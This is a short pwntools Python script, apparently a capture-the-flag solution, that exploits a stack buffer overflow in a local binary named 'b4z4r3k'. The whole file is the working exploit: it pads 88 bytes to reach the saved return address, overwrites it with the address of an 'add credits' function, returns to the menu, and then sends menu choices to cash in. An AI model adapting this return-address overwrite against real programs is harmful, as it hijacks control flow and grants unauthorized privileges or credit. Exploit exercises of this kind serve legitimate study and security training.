from pwn import *


io = process('./b4z4r3k', stdout=process.PTY, stdin=process.PTY)
io.recvuntil(b'> ')

rip_offset = 88
exploit = p8(0x01) * rip_offset #spam stack with a value for addCredits function call
exploit += p64(0x40120c) #add credits function
exploit += p64(0x401305) #return to menu

io.sendline(exploit)
print(io.recvuntil(b'> '))
io.sendline(b'4')
io.recvuntil(b'> ')
io.sendline(b'3')
io.interactive()
